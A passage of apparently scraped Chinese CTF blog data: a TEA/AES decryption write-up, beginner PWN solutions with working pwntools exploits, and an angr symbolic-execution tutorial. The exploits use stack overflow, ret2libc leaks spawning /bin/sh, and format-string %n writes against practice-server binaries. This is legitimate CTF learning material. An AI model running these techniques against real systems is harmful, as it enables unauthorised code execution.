base64cip=base64.b64decode(b'9Kz3YlSdD3lB9KoxeKxXQT4YOEqJTVIuNU+IjW4iFQzjpU+NikF/UqCOsL+1g4eA')key=b'FV8aOaQiak6txP09'IV=b'2Aq7SR5268ZzbouE'aes=AES.new(key,AES.MODE_CBC,iv=IV)print(aes.decrypt(cip))flag1=b'_M)\\x11\\tQ&amp;ej\\x0bN\\xc9O\\xa3\\x93\\x19'flag2=b'742b402d74c1013dadde9}'a=[]for i in flag1: a.append(i)print(a) easyreTEA加密逻辑 动调拿到key 写解密脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;void decrypt(uint32_t* v, int* key) { uint32_t v0 = v[0], v1 = v[1]; uint32_t delta =0x61C88647; uint32_t sum = -delta * 32,tmp; for (int i=0; i&lt;32; i++) { v1-=((sum+key[(sum&gt;&gt;11&amp;3)])^(v0+((16*v0)^(v0&gt;&gt;5)))); sum+=delta; tmp=(sum+key[sum&amp;3])^(v1+((v1*16)^(v1&gt;&gt;5))); v0-=tmp; } v[0]=v0; v[1]=v1;}void encrypt(uint32_t* v, int* key){ uint32_t v0=v[0],v1=v[1]; uint32_t delta =0x61C88647; uint32_t sum=0,tmp; for(int i=0;i&lt;32;i++){ tmp=(sum+key[sum&amp;3])^(v1+((v1*16)^(v1&gt;&gt;5))); sum-=delta; v0+=tmp; v1+=((sum+key[(sum&gt;&gt;11&amp;3)])^(v0+((16*v0)^(v0&gt;&gt;5)))); }}int main(){ unsigned char cip0[] = { 0x34, 0x9B, 0xB2, 0xC0, 0x6A, 0xAF, 0x30, 0xEF,0 }; unsigned char cip1[] = { 0x38, 0xB2,0xCC, 0x98, 0x95, 0xF1, 0xB6, 0x85,0 }; unsigned char cip2[] = { 0x85, 0x06, 0x48, 0xA2,0x59, 0x9B, 0x3D, 0xA6,0 }; unsigned char cip3[] = { 0x1E, 0xC7, 0x91, 0xF1, 0x7B, 0x76,0x90, 0x67,0 }; //uint8_t k[4]={0x9E, 0x37, 0x79, 0xb9}; int key[4]={0x29, 0x4823, 0x18BE, 0x6784}; unsigned int r32;//num_rounds建议取值为32 // v为要加密的数据是两个32位无符号整数 // k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位 decrypt((uint32_t *)cip0,key); decrypt((uint32_t *)cip1,key); decrypt((uint32_t *)cip2,key); decrypt((uint32_t *)cip3,key); //for(int i=0;i&lt;44;i++){ // printf(&quot;%x &quot;,v[i]); //} printf(&quot;%s%s%s%s&quot;,cip0,cip1,cip2,cip3); return 0;}","link":"/2023/01/09/HWS2023%20Winter%20Wp/"},{"title":"PWN(1)","text":"初学pwn，在新手区逛一逛 [TOC] guess_numchecksec一下 然后拖进ida，进到main函数 程序主体就是一个猜数字的游戏，全部都猜对了就给flag（我们一般称这种人为赌怪） 问题出在了gets()函数（是它，又是它！） 观察主程序的栈，通过向v7输入长度为0x20的串后即可覆盖seed，借此控制了seed后就能够预先知道随机数的取值了。然后使用1(int)为种子写了一个简单的脚本 12345678from pwn import *# a=process(&quot;./b59204f56a0545e8a22f8518e749f19f&quot;)a=remote(&quot;111.200.241.244&quot;,&quot;63680&quot;)a.sendlineafter(&quot;name:&quot;,b&quot;a&quot;*0x20+b&quot;\\x00&quot;*7+b&quot;\\x01&quot;)a.interactive()#接下来依次输入以下数字即可2 5 4 2 6 2 5 1 4 2 话说只猜10次，每六分之一的概率，似乎可以暴力猜测（未曾设想的道路） int_overflowchecksec一下 拖进ida，发现有后门函数，同时没有开canary，大概是栈溢出覆盖返回地址了 程序问题在于读入了0x199长度的字符串并将其传入check_passwd函数，在该函数中又通过strcpy()函数将读入的字符串赋给了dest，而dest的栈空间只有0x14-0x9那么大，因此能借此覆盖该函数的返回值。 那么现在的问题在于如何绕开if的判断限制 观察v3的类型，其最大值仅为255而已，当s长度为260~264时，由于数值溢出v3的值依然是处于4~8，由此我们可以构造出解题脚本 1234567from pwn import *# a=process(&quot;./a.out&quot;)a=remote(&quot;111.200.241.244&quot;,&quot;59671&quot;)a.sendlineafter(&quot;choice:&quot;,&quot;1&quot;)a.sendlineafter(&quot;username:\\n&quot;,&quot;abc&quot;)a.sendlineafter(&quot;passwd:\\n&quot;,b&quot;a&quot;*0x18+p32(0x0804868b)+b&quot;a&quot;*232)a.interactive() 得到flag:cyberpeace{f6af6201f84108f5701dab55abbb5c3f} cgpwn2checksec一下 扔进ida，发现有后门函数_system()，但是没有””/bin/sh”。发现有gets()，且name存放在bss段，不会被清除，随后进行一个栈的溢出 编写脚本： 123456from pwn import *# a=process(&quot;./53c24fc5522e4a8ea2d9ad0577196b2f&quot;)a=remote(&quot;111.200.241.244&quot;,&quot;50787&quot;)a.sendlineafter(&quot;name&quot;,&quot;/bin/sh&quot;)a.sendlineafter(&quot;here&quot;,b&quot;a&quot;*0x2a+p32(0x08048420)+4*b&quot;a&quot;+p32(0x0804a080))a.interactive() 获得flag level3checksec一下 用ida打开，主要问题在以下函数： 1234567ssize_t vulnerable_function(){ char buf[136]; // [esp+0h] [ebp-88h] BYREF write(1, &quot;Input:\\n&quot;, 7u); return read(0, buf, 0x100u);} 定义了长度为136的数组，却接受了0x100长度的输入，存在栈溢出的漏洞 level3中并没有system()函数和/bin/sh的字符串，要到所给的另一个附件Libc中找 首先通过覆盖返回值，使其执行write函数，输出got表中的地址，在计算偏移地址 从而得到libc中system函数在运行时的真正地址和/bin/sh字符串的地址 从而第二次执行栈溢出，覆盖返回地址为计算出的system的真正运行地址 附上脚本： 1234567891011121314151617181920212223242526272829# -*- coding: UTF-8 -*-from pwn import *r=remote(&quot;111.200.241.244&quot;,&quot;51966&quot;)elf=ELF(&quot;./level3&quot;)writeplt=elf.plt[&quot;write&quot;]writegot=elf.got[&quot;write&quot;]func=elf.symbols[&quot;vulnerable_function&quot;]libc=ELF(&quot;./libc_32.so.6&quot;)writelibc=libc.symbols[&quot;write&quot;]syslibc=libc.symbols[&quot;system&quot;]binlibc=libc.search(b&quot;/bin/sh&quot;).__next__()payload1=b'a'*0x88+b'aaaa'+p32(writeplt)+p32(func)+p32(1)+p32(writegot)+p32(4)#再次返回func函数为了是进行二次溢出，后面三个分别是wirte函数的参数# 1表示标准输出流stdout,中间是write是要输出的地址，这里要输出writegot，4是输出的长度r.recvuntil(&quot;Input:\\n&quot;)r.sendline(payload1)writeaddr=u32(r.recv(4))sysaddr=writeaddr-writelibc+syslibcbinaddr=writeaddr-writelibc+binlibcpayload2=b'a'*0x88+b'bbbb'+p32(sysaddr)+p32(0xaaaa)+p32(binaddr)r.recvuntil(&quot;Input:\\n&quot;)r.sendline(payload2)r.interactive() 得到flag:cyberpeace{74ba6840cf36f19427c62624ab180b50} CGfsbchecksec一下 扔进ida，看到printf(s)，可以知道与字符串漏洞有关 123456789101112131415161718192021222324252627282930313233int __cdecl main(int argc, const char **argv, const char **envp){ _DWORD buf[2]; // [esp+1Eh] [ebp-7Eh] BYREF __int16 v5; // [esp+26h] [ebp-76h] char s[100]; // [esp+28h] [ebp-74h] BYREF unsigned int v7; // [esp+8Ch] [ebp-10h] v7 = __readgsdword(0x14u); setbuf(stdin, 0); setbuf(stdout, 0); setbuf(stderr, 0); buf[0] = 0; buf[1] = 0; v5 = 0; memset(s, 0, sizeof(s)); puts(&quot;please tell me your name:&quot;); read(0, buf, 0xAu); puts(&quot;leave your message please:&quot;); fgets(s, 100, stdin); printf(&quot;hello %s&quot;, (const char *)buf); puts(&quot;your message is:&quot;); printf(s); if ( pwnme == 8 ) { puts(&quot;you pwned me, here is your flag:\\n&quot;); system(&quot;cat flag&quot;); } else { puts(&quot;Thank you!&quot;); } return 0;} 看伪代码，需要pwnme=8才能得到flag，双击得到地址0x0804a068 接着看偏移量，得到偏移量为10 构造payload，通过%n偏移10来改变pwnme的值 123456from pwn import *a=process(&quot;e41a0f684d0e497f87bb309f91737e4d&quot;)a.sendafter(&quot;name:&quot;,&quot;abc&quot;)payload=p32(0x0804a068)+b&quot;aaaa&quot;+b&quot;%10$n&quot;a.sendafter(&quot;please&quot;,payload)a.interactive() 得到flag （服务器又又又开摆了，开不了靶机交互不了，无语了）","link":"/2022/02/08/PWN-1/"},{"title":"Reverse angr","text":"[Toc] 符号执行符号执行就是在运行程序时，用符号来替代真实值。符号执行相较于真实值执行的优点在于，当使用真实值执行程序时，我们能够遍历的程序路径只有一条, 而使用符号进行执行时，由于符号是可变的，我们就可以利用这一特性，尽可能的将程序的每一条路径遍历，这样的话，必定存在至少一条能够输出正确结果的分支, 每一条分支的结果都可以表示为一个离散关系式,使用约束求解引擎即可分析出正确结果。 Angr安装(31条消息) kali中angr的安装步骤_流风_霜的博客-CSDN博客 安装好后通过命令 source venv/bin/activate 进入虚拟环境中，即可使用angr 使用方法新建一个工程12import angrproj=angr.Project('/bin/true') 然后可以得到二进制文件的信息，如： 123proj.filename #文件名proj.arch #一个archinfo.Arch对象hex(proj.entry) #入口点 '0x401370' 通常在创建工程时选择关闭auto_load_libs以避免angr加载共享库： 1p=angr.Project('/bin/true',auto_load_libs=False) 如果auto_load_libs是True（默认值），真正的库函数会被执行。这可能正是也可能不是你想要的，取决于具体的函数。比如说一些libc的函数分析起来过于复杂并且很有可能引起path对其的尝试执行过程中的state数量的爆炸增长 如果auto_load_libs是False，且外部函数是无法找到的，并且Project会将它们引用到一个通用的叫做ReturnUnconstrained的SimProcedure上去，它就像它的名字所说的那样：它返回一个不受约束的值 设置state1initial_state=project.factory.entry_state() state代表程序的一个实例镜像，模拟执行某个时刻的状态，就类似于快照。保存运行状态的上下文信息，如内存/寄存器等,我们这里使用project.factory.entry_state()告诉符号执行引擎从程序的入口点开始符号执行，除了使用.entry_state() 创建 state 对象, 我们还可以根据需要使用其他构造函数创建 state 除了使用.entry_state() 创建 state 对象, 我们还可以根据需要使用其他构造函数创建 state: 名称 描述 .entry_state() 构造一个已经准备好从函数入口点执行的状态 .blank_state 构造一个“空状态”，它的大多数数据都是未初始化的。当使用未初始化的的数据时，一个不受约束的符号值将会被返回 .call_state 构造一个已经准备好执行某个函数的状态 .full_init_state 构造一个已经执行过所有与需要执行的初始化函数，并准备从函数入口点执行的状态。比如，共享库构造函数（constructor）或预初始化器。当这些执行完之后，程序将会跳到入口点 设置 Simulation Managers1simulation = project.factory.simgr(initial_state) Project 对象仅表示程序一开始的样子，而在执行时，我们实际上是对SimState对象进行操作，它代表程序的一个实例镜像，模拟执行某个时刻的状态 SimState 对象包含程序运行时信息，如内存/寄存器/文件系统数据等。SM（Simulation Managers）是angr中最重要的控制接口，它使你能够同时控制一组状态(state)的符号执行，应用搜索策略来探索程序的状态空间。 模拟管理器具有不同的探索策略，默认策略为广度优先搜索，使用不同的探索策略可以通过调用 simgr.use_technique(tech) 来实现，其中 tech 是一个 ExplorationTechnique 子类的实例，angr 内置的探索技术在 angr.exploration_techniques 下 Explorer：该技术实现了 .explore() 功能，允许在探索时查找或避免某些地址。 DFS：深度优先搜索，每次只探索一条路径，其它路径会放到 deferred stash 中。直到当前路径探索结束，再从 deferred 中取出最长的一条继续探索。 LoopLimiter：限制路径的循环次数，超出限制的路径将被放到 discard stash 中。 LengthLimiter：限制路径的最大长度 ManualMergepoint：将程序中的某个地址标记为合并点，将在一定时间范围内到达的所有 state 合并在一起。 Veritesting：是这篇论文的实现，试图识别出有用的合并点来解决路径爆炸问题。在创建 SimulationManager 时通过 veritesting=True 来开启。 Tracer：记录在某个具体输入下的执行路径，结果是执行完最后一个 basic block 的 state，存放在 traced stash 中。 Oppologist：当遇到某个不支持的指令时，它将具体化该指令的所有输入并使用 unicorn engine 继续执行。 Threading：将线程级并行添加到探索过程中。 Spiller：当处于 active 的 state 过多时，将其中一些转存到磁盘上以保持较低的内存消耗。 运行，探索满足路径需要的值1simulation.explore=(find=your_address) 符号执行最普遍的操作是找到能够到达某个地址的状态，同时丢弃其他不能到达这个地址的状态。SM为使用这种执行模式提供了.explore()方法 当使用find参数启动.explore()方法时，程序将会一直执行，直到发现了一个和find参数指定的条件相匹配的状态。find参数的内容可以是想要执行到的某个地址、或者想要执行到的地址列表、或者一个获取state作为参数并判断这个state是否满足某些条件的函数。当activestash中的任意状态和find中的条件匹配的时候，它们就会被放到found stash中，执行随即停止。之后你可以探索找到的状态，或者决定丢弃它，转而探索其它状态。 获取执行结果当找到匹配的条件的时候，相关的状态被保存在simgr当中，我们可以通过simgr.found来访问所有符合条件的分支 1234if simulation.found: solution_state = simulation.found[0] # 获取通过 explore 找到符合条件的状态 solution = solution_state.posix.dumps(sys.stdin.fileno()) print(&quot;[+] Success! Solution is: {}&quot;.format(solution.decode(&quot;utf-8&quot;))) 位向量(bitvector)更准确的说是符号位向量，符号位向量是angr用于将符号值注入程序的数据类型。这些将是angr将解决的方程式的“ x”，也就是约束求解时的自变量。可以通过 BVV(value,size) 和 BVS( name, size) 接口创建位向量，也可以用 FPV 和 FPS 来创建浮点值和符号 这里使用BVS生成了一个位向量，此方法有两个参数：第一个是angr用来引用位向量的名称，第二个是位向量的大小（以bit为单位） 12size_in_bits=32x=claripy.BVS('x', size_in_bits) 访问寄存器可以通过statr.regs对象的属性来访问或修改寄存器的数据，例： 1initial_state.regs.eax=passwd0 eval solver.eval(expression) 将会解出一个可行解 solver.eval_one(expression)将会给出一个表达式的可行解，若有多个可行解，则抛出异常。 solver.eval_upto(expression, n)将会给出最多n个可行解，如果不足n个就给出所有的可行解。 solver.eval_exact(expression, n)将会给出n个可行解，如果解的个数不等于n个，将会抛出异常。 solver.min(expression)将会给出最小可行解 solver.max(expression)将会给出最大可行解 另外还有还有cast_to可以接收一个参数来指定把结果映射到哪种数据类型。目前这个参数只能是str，它将会以字符串形式展示返回的结果 Hook 钩子编程（hooking），也称作“挂钩”，是计算机程序设计术语，指通过拦截软件模块间的函数调用、消息传递、事件传递来修改或扩展操作系统、应用程序或其他软件组件的行为的各种技术。处理被拦截的函数调用、事件、消息的代码，被称为钩子（hook）。 简单来说就是用我们自己设计的函数去取代被hook的函数 一个简单的例子： 123@project.hook(0x1234,length=5)def set_rax(state): state.regs.rax=1 Hooking Symbols每一个程序都有一个符号表，angr可以确保从每个导入符号都可以解析出地址，可以使用angr提供的Project.hook_symbolAPI来通过符号名来Hook函数所有的调用地址，这意味着可以用自己的代码替换函数，一个简单的例子： 12345678&gt;&gt;&gt; class NotVeryRand(SimProcedure):... def run(self, return_values=None):... rand_idx = self.state.globals.get('rand_idx', 0) % len(return_values)... out = return_values[rand_idx]... self.state.globals['rand_idx'] = rand_idx + 1... return out&gt;&gt;&gt; project.hook_symbol('rand', NotVeryRand(return_values=[413, 612, 1025, 1111])) pre-binary 选项如果你想要对一个特定的二进制对象设置一些选项，CLE也能满足你的需求在加载二进制文件时可以设置特定的参数，使用 main_opts 和 lib_opts 参数进行设置。 backend - 指定 backend base_addr - 指定基址 entry_point - 指定入口点 arch - 指定架构 示例如下： 12&gt;&gt;&gt; angr.Project('examples/fauxware/fauxware', main_opts={'backend': 'blob', 'arch': 'i386'}, lib_opts={'libc.so.6': {'backend': 'elf'}})&lt;Project examples/fauxware/fauxware&gt; 参数main_opts和lib_opts接收一个以python字典形式存储的选项组。main_opts接收一个形如{选项名1：选项值1，选项名2：选项值2……}的字典，而lib_opts接收一个库名到形如{选项名1:选项值1，选项名2:选项值2……}的字典的映射。 lib_opts是二级字典，原因是一个二进制文件可能加载多个库，而main_opts指定的是主程序加载参数，而主程序一般只有一个，因此是一级字典。 这些选项的内容因不同的后台而异，下面是一些通用的选项： backend —— 使用哪个后台，可以是一个对象，也可以是一个名字(字符串) custom_base_addr —— 使用的基地址 custom_entry_point —— 使用的入口点 custom_arch —— 使用的处理器体系结构的名字 题目 from angr CTF题目来源：angr CTF (oregonctf.org) 00_angr_find123456789101112131415161718192021222324252627282930import angrimport sysdef main(argv): path_to_binary = '00_angr_find' # :string project = angr.Project(path_to_binary) initial_state = project.factory.entry_state( add_options = { angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY, angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS} ) simulation = project.factory.simgr(initial_state) print_good_address = 0x080492f8 # :integer (probably in hexadecimal) simulation.explore(find=print_good_address) if simulation.found: solution_state = simulation.found[0] print(solution_state.posix.dumps(sys.stdin.fileno()).decode()) else: raise Exception('Could not find the solution')if __name__ == '__main__': main(sys.argv) 01_angr_avoid12345678910111213141516171819202122232425import angrimport sysdef main(argv): path_to_binary = '01_angr_avoid' project = angr.Project(path_to_binary) initial_state = project.factory.entry_state( add_options = { angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY, angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS} ) simulation = project.factory.simgr(initial_state) print_good_address = 0x08049300 will_not_succeed_address = 0x080492bb simulation.explore(find=print_good_address, avoid=will_not_succeed_address) if simulation.found: solution_state = simulation.found[0] print(solution_state.posix.dumps(sys.stdin.fileno()).decode()) else: raise Exception('Could not find the solution')if __name__ == '__main__': main(sys.argv) 02_angr_find_condition通过程序输出判断是否符合条件（此题把第一题改一改也能过，但这样就没意思了） 1234567891011121314151617181920212223242526272829303132333435import angrimport sysdef main(argv): path_to_binary = '02_angr_find_condition' project = angr.Project(path_to_binary) initial_state = project.factory.entry_state( add_options = { angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY, angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS} ) simulation = project.factory.simgr(initial_state) def is_successful(state):# Dump whatever has been printed out by the binary so far into a string. stdout_output = state.posix.dumps(sys.stdout.fileno()) # Return whether 'Good Job.' has been printed yet. # (!) return stdout_output==b'Enter the password: Good Job.\\n' # :boolean def should_abort(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return stdout_output==b'Enter the password: Try again.\\n' # :boolean simulation.explore(find=is_successful, avoid=should_abort) if simulation.found: solution_state = simulation.found[0] print(solution_state.posix.dumps(sys.stdin.fileno()).decode()) else: raise Exception('Could not find the solution')if __name__ == '__main__': main(sys.argv) 03_angr_simbolic_registersangr在处理scanf等复杂输入时不太方便，此时将入口地址设置为输入函数之后，通过符号化寄存器来获得理想输入 看一下汇编，输入的三个参数分别放在eax,ebx,edx三个寄存器中，我们需要符号化这三个寄存器 但是对于为什么在scanf执行后需要重设ebp=esp仍有不太理解… 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990# Angr doesn't currently support reading multiple things with scanf (Ex: # scanf(&quot;%u %u).) You will have to tell the simulation engine to begin the# program after scanf is called and manually inject the symbols into registers.import angrimport claripyimport sysdef main(argv): path_to_binary = '03_angr_symbolic_registers' project = angr.Project(path_to_binary) # Sometimes, you want to specify where the program should start. The variable # start_address will specify where the symbolic execution engine should begin. # Note that we are using blank_state, not entry_state. # (!) start_address = 0x08049626 # :integer (probably hexadecimal) initial_state = project.factory.blank_state( addr=start_address, add_options = { angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY, angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS} ) # Create a symbolic bitvector (the datatype Angr uses to inject symbolic # values into the binary.) The first parameter is just a name Angr uses # to reference it. # You will have to construct multiple bitvectors. Copy the two lines below # and change the variable names. To figure out how many (and of what size) # you need, dissassemble the binary and determine the format parameter passed # to scanf. # (!) password0_size_in_bits = 32 # :integer password0 = claripy.BVS('password0', password0_size_in_bits) password1_size_in_bits = 32 # :integer password1 = claripy.BVS('password0', password1_size_in_bits) password2_size_in_bits = 32 # :integer password2 = claripy.BVS('password0', password2_size_in_bits) # Set a register to a symbolic value. This is one way to inject symbols into # the program. # initial_state.regs stores a number of convenient attributes that reference # registers by name. For example, to set eax to password0, use: # # initial_state.regs.eax = password0 # # You will have to set multiple registers to distinct bitvectors. Copy and # paste the line below and change the register. To determine which registers # to inject which symbol, dissassemble the binary and look at the instructions # immediately following the call to scanf. # (!) initial_state.regs.eax = password0 initial_state.regs.ebx = password1 initial_state.regs.edx = password2 simulation = project.factory.simgr(initial_state) def is_successful(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b'Good Job.' in stdout_output def should_abort(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b'Try again.' in stdout_output simulation.explore(find=is_successful, avoid=should_abort) if simulation.found: solution_state = simulation.found[0] # Solve for the symbolic values. If there are multiple solutions, we only # care about one, so we can use eval, which returns any (but only one) # solution. Pass eval the bitvector you want to solve for. # (!) solution0 = solution_state.solver.eval(password0) solution1 = solution_state.solver.eval(password1) solution2 = solution_state.solver.eval(password2) # Aggregate and format the solutions you computed above, and then print # the full string. Pay attention to the order of the integers, and the # expected base (decimal, octal, hexadecimal, etc). solution = hex(solution0)[2:]+' '+hex(solution1)[2:]+' '+hex(solution2)[2:] # :string print(solution) else: raise Exception('Could not find the solution')if __name__ == '__main__': main(sys.argv) 04_angr_symbolic_stack符号化栈 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165# This challenge will be more challenging than the previous challenges that you# have encountered thus far. Since the goal of this CTF is to teach symbolic# execution and not how to construct stack frames, these comments will work you# through understanding what is on the stack.# ! ! !# IMPORTANT: Any addresses in this script aren't necessarily right! Dissassemble# the binary yourself to determine the correct addresses!# ! ! !import angrimport claripyimport sysdef main(argv): path_to_binary = '04_angr_symbolic_stack' project = angr.Project(path_to_binary) # For this challenge, we want to begin after the call to scanf. Note that this # is in the middle of a function. # # This challenge requires dealing with the stack, so you have to pay extra # careful attention to where you start, otherwise you will enter a condition # where the stack is set up incorrectly. In order to determine where after # scanf to start, we need to look at the dissassembly of the call and the # instruction immediately following it: # sub $0x4,%esp # lea -0x10(%ebp),%eax # push %eax # lea -0xc(%ebp),%eax # push %eax # push $0x80489c3 # call 8048370 &lt;__isoc99_scanf@plt&gt; # add $0x10,%esp # Now, the question is: do we start on the instruction immediately following # scanf (add $0x10,%esp), or the instruction following that (not shown)? # Consider what the 'add $0x10,%esp' is doing. Hint: it has to do with the # scanf parameters that are pushed to the stack before calling the function. # Given that we are not calling scanf in our Angr simulation, where should we # start? # (!) start_address = 0x080493f2 initial_state = project.factory.blank_state( addr=start_address, add_options = { angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY, angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS} ) # We are jumping into the middle of a function! Therefore, we need to account # for how the function constructs the stack. The second instruction of the # function is: # mov %esp,%ebp # At which point it allocates the part of the stack frame we plan to target: # sub $0x18,%esp # Note the value of esp relative to ebp. The space between them is (usually) # the stack space. Since esp was decreased by 0x18 # # /-------- The stack --------\\ # ebp -&gt; | | # |---------------------------| # | | # |---------------------------| # . . . (total of 0x18 bytes) # . . . Somewhere in here is # . . . the data that stores # . . . the result of scanf. # esp -&gt; | | # \\---------------------------/ # # Since we are starting after scanf, we are skipping this stack construction # step. To make up for this, we need to construct the stack ourselves. Let us # start by initializing ebp in the exact same way the program does. initial_state.regs.ebp = initial_state.regs.esp # scanf(&quot;%u %u&quot;) needs to be replaced by injecting two bitvectors. The # reason for this is that Angr does not (currently) automatically inject # symbols if scanf has more than one input parameter. This means Angr can # handle 'scanf(&quot;%u&quot;)', but not 'scanf(&quot;%u %u&quot;)'. # You can either copy and paste the line below or use a Python list. # (!) password0 = claripy.BVS('password0', 32) password1 = claripy.BVS('password1', 32) ... # Here is the hard part. We need to figure out what the stack looks like, at # least well enough to inject our symbols where we want them. In order to do # that, let's figure out what the parameters of scanf are: # sub $0x4,%esp # lea -0x10(%ebp),%eax # push %eax # lea -0xc(%ebp),%eax # push %eax # push $0x80489c3 # call 8048370 &lt;__isoc99_scanf@plt&gt; # add $0x10,%esp # As you can see, the call to scanf looks like this: # scanf( 0x80489c3, ebp - 0xc, ebp - 0x10 ) # format_string password0 password1 # From this, we can construct our new, more accurate stack diagram: # # /-------- The stack --------\\ # ebp -&gt; | padding | # |---------------------------| # ebp - 0x01 | more padding | # |---------------------------| # ebp - 0x02 | even more padding | # |---------------------------| # . . . &lt;- How much padding? Hint: how # |---------------------------| many bytes is password0? # ebp - 0x0b | password0, second byte | # |---------------------------| # ebp - 0x0c | password0, first byte | # |---------------------------| # ebp - 0x0d | password1, last byte | # |---------------------------| # . . . # |---------------------------| # ebp - 0x10 | password1, first byte | # |---------------------------| # . . . # |---------------------------| # esp -&gt; | | # \\---------------------------/ # # Figure out how much space there is and allocate the necessary padding to # the stack by decrementing esp before you push the password bitvectors. padding_length_in_bytes = 8 # :integer initial_state.regs.esp -= padding_length_in_bytes # Push the variables to the stack. Make sure to push them in the right order! # The syntax for the following function is: # # initial_state.stack_push(bitvector) # # This will push the bitvector on the stack, and increment esp the correct # amount. You will need to push multiple bitvectors on the stack. # (!) initial_state.stack_push(password1) # :bitvector (claripy.BVS, claripy.BVV, claripy.BV) initial_state.stack_push(password0) simulation = project.factory.simgr(initial_state) def is_successful(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b'Good Job.' in stdout_output def should_abort(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b'Try again.' in stdout_output simulation.explore(find=is_successful, avoid=should_abort) if simulation.found: solution_state = simulation.found[0] solution0 = solution_state.solver.eval(password0) solution1 = solution_state.solver.eval(password1) solution = str(solution1)+' '+str(solution0) print(solution) else: raise Exception('Could not find the solution')if __name__ == '__main__': main(sys.argv) 05_angr_symbolic_memory内存符号化，取输入内容所存放的地址，然后将符号存到这个地址 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768import angrimport claripyimport sysdef main(argv): path_to_binary = '05_angr_symbolic_memory' project = angr.Project(path_to_binary) start_address = 0x08049315 initial_state = project.factory.blank_state( addr=start_address, add_options = { angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY, angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS} ) # The binary is calling scanf(&quot;%8s %8s %8s %8s&quot;). # (!) password0 = claripy.BVS('password0', 64) password1 = claripy.BVS('password1', 64) password2 = claripy.BVS('password2', 64) password3 = claripy.BVS('password3', 64) # Determine the address of the global variable to which scanf writes the user # input. The function 'initial_state.memory.store(address, value)' will write # 'value' (a bitvector) to 'address' (a memory location, as an integer.) The # 'address' parameter can also be a bitvector (and can be symbolic!). # (!) password0_address = 0x09cdc1a0 initial_state.memory.store(password0_address, password0) password1_address = 0x09cdc1a8 initial_state.memory.store(password1_address, password1) password2_address = 0x09cdc1b0 initial_state.memory.store(password2_address, password2) password3_address = 0x09cdc1b8 initial_state.memory.store(password3_address, password3) simulation = project.factory.simgr(initial_state) def is_successful(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b'Good Job.' in stdout_output def should_abort(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b'Try again.' in stdout_output simulation.explore(find=is_successful, avoid=should_abort) if simulation.found: solution_state = simulation.found[0] # Solve for the symbolic values. We are trying to solve for a string. # Therefore, we will use eval, with named parameter cast_to=bytes # which returns bytes that can be decoded to a string instead of an integer. # (!) solution0 = solution_state.solver.eval(password0,cast_to=bytes).decode() solution1 = solution_state.solver.eval(password1,cast_to=bytes).decode() solution2 = solution_state.solver.eval(password2,cast_to=bytes).decode() solution3 = solution_state.solver.eval(password3,cast_to=bytes).decode() solution = solution0+solution1+solution2+solution3 print(solution) else: raise Exception('Could not find the solution')if __name__ == '__main__': main(sys.argv) 06_angr_symbolic_dynamic_memory这题使用了malloc来分配内存，因此需要使用符号化动态内存 而与其获得每一次malloc分配的地址，不如直接虚构一个假地址，并将这个假地址写入内存指针 回到我们最开始认识angr的时候，我们知道angr并没有真正“运行”二进制文件（至少到目前为止），它只是在模拟运行状态，因此它实际上不需要将内存分配到堆中，实际上可以伪造任何地址。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970import angrimport claripyimport sysdef main(argv): path_to_binary = '06_angr_symbolic_dynamic_memory' project = angr.Project(path_to_binary) start_address = 0x0804938c initial_state = project.factory.blank_state( addr=start_address, add_options = { angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY, angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS} ) # The binary is calling scanf(&quot;%8s %8s&quot;). # (!) password0 = claripy.BVS('password0', 64) password1 = claripy.BVS('password1', 64) # Instead of telling the binary to write to the address of the memory # allocated with malloc, we can simply fake an address to any unused block of # memory and overwrite the pointer to the data. This will point the pointer # with the address of pointer_to_malloc_memory_address0 to fake_heap_address. # Be aware, there is more than one pointer! Analyze the binary to determine # global location of each pointer. # Note: by default, Angr stores integers in memory with big-endianness. To # specify to use the endianness of your architecture, use the parameter # endness=project.arch.memory_endness. On x86, this is little-endian. # (!) fake_heap_address0 = 0x08094035 pointer_to_malloc_memory_address0 = 0x09ec4c94 initial_state.memory.store(pointer_to_malloc_memory_address0, fake_heap_address0, endness=project.arch.memory_endness) fake_heap_address1 = 0x08094055 pointer_to_malloc_memory_address1 = 0x09ec4c9c initial_state.memory.store(pointer_to_malloc_memory_address1, fake_heap_address1, endness=project.arch.memory_endness) # Store our symbolic values at our fake_heap_address. Look at the binary to # determine the offsets from the fake_heap_address where scanf writes. # (!) initial_state.memory.store(fake_heap_address0, password0) initial_state.memory.store(fake_heap_address1, password1) simulation = project.factory.simgr(initial_state) def is_successful(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b'Good Job.' in stdout_output def should_abort(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b'Try again.' in stdout_output simulation.explore(find=is_successful, avoid=should_abort) if simulation.found: solution_state = simulation.found[0] solution0 = 